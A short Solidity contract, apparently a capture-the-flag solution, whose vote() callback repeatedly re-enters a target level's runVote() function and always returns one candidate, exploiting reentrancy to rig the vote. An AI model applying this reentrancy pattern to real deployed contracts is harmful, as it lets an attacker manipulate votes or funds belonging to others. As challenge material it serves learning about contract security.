// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface LevelInterface {
    function runVote() external;
}

contract Solve {
    uint constant VOTE_AMO = 0;
    uint constant VOTE_BOKO = 1;
    uint constant VOTE_NANDO = 2;

    uint counter = 0;
    LevelInterface level;

    constructor (address addr) {
        level = LevelInterface(addr);
    }

    function vote() external returns (uint) {
        if (counter <= 11){
            counter++;
            level.runVote();
        } else {
            counter = 0;
        }
        return VOTE_BOKO;
    }
}
